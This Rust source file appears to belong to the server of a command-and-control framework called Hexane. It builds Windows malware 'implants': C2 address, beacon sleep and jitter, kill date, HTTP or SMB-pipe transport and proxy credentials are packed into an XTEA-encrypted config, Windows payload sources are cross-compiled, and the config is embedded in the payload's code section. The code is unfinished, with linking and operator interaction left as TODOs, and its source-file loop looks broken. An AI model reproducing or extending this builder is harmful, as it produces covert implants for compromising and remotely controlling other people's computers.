use std::{env, fs};
use rand::Rng;
use std::str::FromStr;
use std::borrow::Borrow;
use std::collections::HashMap;
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::sync::mpsc::channel;

use rayon::prelude::*;
use crate::server::rstatic::{CURDIR, DEBUG_FLAGS, HASHES, INSTANCES, RELEASE_FLAGS, SESSION, STRINGS};
use crate::server::types::{NetworkType, NetworkOptions, Config, Compiler, Network, Builder, Loader, UserSession, JsonData};
use crate::server::utils::{create_directory, generate_definitions, generate_hashes, normalize_path, canonical_path, run_command, source_to_outpath, wrap_message};
use crate::server::cipher::{crypt_create_key, crypt_xtea};
use crate::server::binary::embed_section_data;
use crate::server::error::{Error, Result};
use crate::server::stream::Stream;
use crate::{return_error, length_check_defer};


fn map_config(file_path: &String) -> Result<Hexane> {
    let json_file   = CURDIR.join("json").join(file_path);

    let contents    = fs::read_to_string(json_file).map_err(Error::Io)?;
    let json_data   = serde_json::from_str::<JsonData>(contents.as_str())?;

    let mut instance    = Hexane::default();
    let session         = SESSION.lock().unwrap();

    instance.group_id       = 0;
    instance.main           = json_data.config;
    instance.loader         = json_data.loader;
    instance.builder        = json_data.builder;
    instance.network        = json_data.network;
    instance.user_session   = session.clone();

    Ok(instance)
}

pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
    length_check_defer!(args, 3);

    let mut instance = match map_config(&args[2]) {
        Ok(instance)    => instance,
        Err(e)          => return Err(e)
    };

    match instance.setup_instance() {
        Ok(_)   => { },
        Err(e)  => return_error!("load_instance::{e}")
    }

    let ref session = SESSION.lock().unwrap();

    instance.user_session.username = session.username.clone();
    instance.user_session.is_admin = session.is_admin.clone();

    wrap_message("info", &format!("{} is ready", instance.builder.output_name));
    INSTANCES.lock().unwrap().push(instance);

    // todo: insert db

    Ok(())
}

pub(crate) fn remove_instance(args: Vec<String>) -> Result<()> {
    length_check_defer!(args, 3);
    // todo: remove from db

    let mut instances   = INSTANCES.lock().unwrap();
    if let Some(pos)    = instances.iter().position(|instance| instance.builder.output_name == args[2]) {

        wrap_message("info", &format!("removing {}", instances[pos].builder.output_name));
        instances.remove(pos);

        Ok(())
    }
    else {
        return_error!("Implant not found")
    }
}


pub(crate) fn interact_instance(args: Vec<String>) -> Result<()> {
    // todo:: implement
    Ok(())
}


#[derive(Debug, Default)]
pub struct Hexane {
    pub(crate) current_taskid:  u32,
    pub(crate) peer_id:         u32,
    pub(crate) group_id:        u32,
    pub(crate) build_type:      u32,

    pub(crate) crypt_key:       Vec<u8>,
    pub(crate) shellcode:       Vec<u8>,
    pub(crate) config_data:     Vec<u8>,
    pub(crate) active:          bool,

    pub(crate) main:            Config,
    pub(crate) builder:         Builder,
    pub(crate) compiler:        Compiler,
    pub(crate) network:         Option<Network>, // says "optional" but is checked for in config
    pub(crate) loader:          Option<Loader>,
    pub(crate) user_session:    UserSession,
}
impl Hexane {
    // todo: add config db write/delete

    fn setup_instance(&mut self) -> Result<()> {
        let mut rng = rand::thread_rng();

        self.compiler.build_directory = format!("./payload/{}", self.builder.output_name);
        self.peer_id    = rng.random::<u32>();
        self.group_id   = 0;

        if self.main.debug {
            self.compiler.compiler_flags = DEBUG_FLAGS.parse().unwrap();
        }
        else {
            self.compiler.compiler_flags = RELEASE_FLAGS.parse().unwrap();
        }

        match create_directory(&self.compiler.build_directory) {
            Ok(_)   => wrap_message("debug", &"created build directory".to_owned()),
            Err(e)  => return_error!("setup_instance::{e}")
        }

        match self.generate_config_bytes() {
            Ok(_)   => wrap_message("debug", &"config data generated".to_owned()),
            Err(e)  => return_error!("setup_instance::{e}")
        }

        match generate_hashes(STRINGS, HASHES) {
            Ok(_)   => wrap_message("debug", &"generated string hashes".to_owned()),
            Err(e)  => return_error!("setup_instance::{e}")
        }

        match self.compile_sources() {
            Ok(_)   => wrap_message("debug", &"generated payload".to_owned()),
            Err(e)  => return_error!("setup_instance::{e}")
        }

        Ok(())
    }

    fn generate_config_bytes(&mut self) -> Result<()> {
        self.crypt_key  = crypt_create_key(16);

        let mut patch = match self.create_binary_patch() {
            Ok(patch)   => patch,
            Err(e)      => return_error!("generate_config_bytes::{e}"),
        };

        if self.main.encrypt {
            let patch_cpy   = patch.clone();
            patch           = crypt_xtea(&patch_cpy, &self.crypt_key, true)?;
        }

        self.config_data = patch;
        Ok(())
    }

    fn create_binary_patch(&mut self) -> Result<Vec<u8>> {
        let mut stream = Stream::new();

        if let Some(modules) = &self.builder.loaded_modules {
            for module in modules {
                stream.pack_string(module);
            }
        }
        else {
            wrap_message("debug", &"no external module names found. continue.".to_owned());
        }

        let working_hours = if let Some(ref hours) = self.main.working_hours {
            match i32::from_str(hours) {
                Ok(hours)   => hours,
                Err(e)      => return_error!("create_binary_patch::{e}")
            }
        }
        else { 0 };

        let kill_date = if let Some(ref date) = self.main.killdate {
            match i64::from_str(date) {
                Ok(date)    => date,
                Err(e)      => return_error!("create_binary_patch::{e}")
            }
        }
        else { 0 };

        stream.pack_bytes(&self.crypt_key);
        stream.pack_string(&self.main.hostname);

        stream.pack_dword(self.peer_id);
        stream.pack_dword(self.main.sleeptime);
        stream.pack_dword(self.main.jitter as u32);

        stream.pack_int32(working_hours);
        stream.pack_dword64(kill_date);

        if let Some(network) = self.network.as_mut() {
            match (&network.r#type, &network.options) {

                (NetworkType::Http, NetworkOptions::Http(ref http)) => {
                    stream.pack_wstring(http.useragent.as_ref().unwrap());
                    stream.pack_wstring(&http.address);
                    stream.pack_dword(http.port as u32);
                    stream.pack_dword(http.endpoints.len() as u32);

                    for endpoint in &http.endpoints {
                        stream.pack_wstring(endpoint);
                    }

                    if http.domain.is_some() {
                        stream.pack_string(http.domain.as_ref().unwrap().as_str());
                    }

                    if let Some(ref proxy) = http.proxy { // todo: proxy should not be exclusive to http (socks5, ftp, etc...)
                        let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);

                        stream.pack_dword(1);
                        stream.pack_wstring(&proxy_url);
                        stream.pack_wstring(proxy.username.as_ref().unwrap());
                        stream.pack_wstring(proxy.password.as_ref().unwrap());
                    }
                    else {
                        stream.pack_dword(0);
                    }
                },
                (NetworkType::Smb, NetworkOptions::Smb(ref smb)) => {
                    stream.pack_wstring(smb.egress_pipe.as_ref().unwrap().as_str());
                },

                _ => return_error!("create_binary_patch: unknown network type")
            }
        }

        Ok(stream.buffer)
    }

    fn compile_object(&mut self, mut command: String, source: String, mut flags: String) -> Result<()> {
        let mut defs: HashMap<String, Option<u8>> = HashMap::new();

        let build = match source_to_outpath(source, &self.compiler.build_directory) {
            Ok(build)   => build,
            Err(e)      => return_error!("compile_object::{e}")
        };

        if command.trim() != "ld" && command.trim() != "nasm" {
            if self.main.debug {
                defs.insert("DEBUG".to_string(), None);
            }

            if &self.main.architecture == "amd64" {
                defs.insert("BSWAP".to_string(), Some(0));
            } else {
                defs.insert("BSWAP".to_string(), Some(1));
            }

            if let Some(network) = &self.network {
                match network.r#type {
                    NetworkType::Http   => { defs.insert("TRANSPORT_HTTP".to_string(), None); }
                    NetworkType::Smb    => { defs.insert("TRANSPORT_PIPE".to_string(), None); }
                }
            }
        }

        for (k, v) in &defs {
            command.push_str(&generate_definitions(&HashMap::from([(k.clone(), v.clone())])));
        }

        flags.push_str(fs::canonicalize(env::current_dir()?)?.to_str().unwrap());
        flags.push_str(&format!(" -o {} ", build));
        command.push_str(&flags);

        run_command(&command, &self.peer_id.to_string())
    }

    pub fn compile_sources(&mut self) -> Result<()> {
        let src_path        = Path::new(&self.builder.root_directory).join("src");
        let mut components  = self.compiler.components.clone();

        let entries = match fs::canonicalize(src_path) {
            Ok(entries) => entries,
            Err(e)      => return_error!("compile_sources::read_canonical_path::{e}")
        };

        let (err_send, err_recv)    = channel();
        let atoms                   = Arc::new(Mutex::new(()));

        entries.iter().for_each(|absolute_path| {
            if !absolute_path.is_file() {
                return;
            }

            let output  = self.builder.output_name.clone();
            let compile = self.compiler.compiler_flags.clone();

            let mut command = String::new();
            let mut flags   = String::new();

            let atoms_clone = Arc::clone(&atoms);
            let err_handle  = err_send.clone();
            let _guard      = atoms_clone.lock().unwrap();

            let absolute_str = match absolute_path.to_str() {
                Some(path_str)  => { normalize_path(path_str) }
                None            => { Err("compile_sources: cannot convert path to string").unwrap() }
            };

            match absolute_path.extension().and_then(|ext| ext.to_str()) {
                Some("asm") => {

                    command.push_str("nasm");
                    flags = " -f win64 ".to_string();
                    flags.push_str(&absolute_str);
                }

                Some("cpp") => {

                    command.push_str("x86_64-w64-mingw32-g++");
                    flags.push_str(" -c ");
                    flags.push_str(&absolute_str);

                    flags.push_str(" ");
                    flags.push_str(compile.as_str());
                }

                _ => { return; }
            }

            if let Err(e) = self.compile_object(command, absolute_str.clone(), flags) {
                err_handle.send(e).unwrap();
            }
            else {
                components.push(output);
            }
        });

        if let Ok(e) = err_recv.try_recv() {
            return_error!("compile_sources::{e}");
        }

        wrap_message("debug", &"Linking final objects".to_owned());
        match embed_section_data(&self.builder.output_name, ".text$F", &self.config_data.as_slice()) {
            Ok(_)   => { },
            Err(e)  => return_error!("compile_sources::{e}")
        }

        // TODO: link all objects

        Ok(())
    }
}

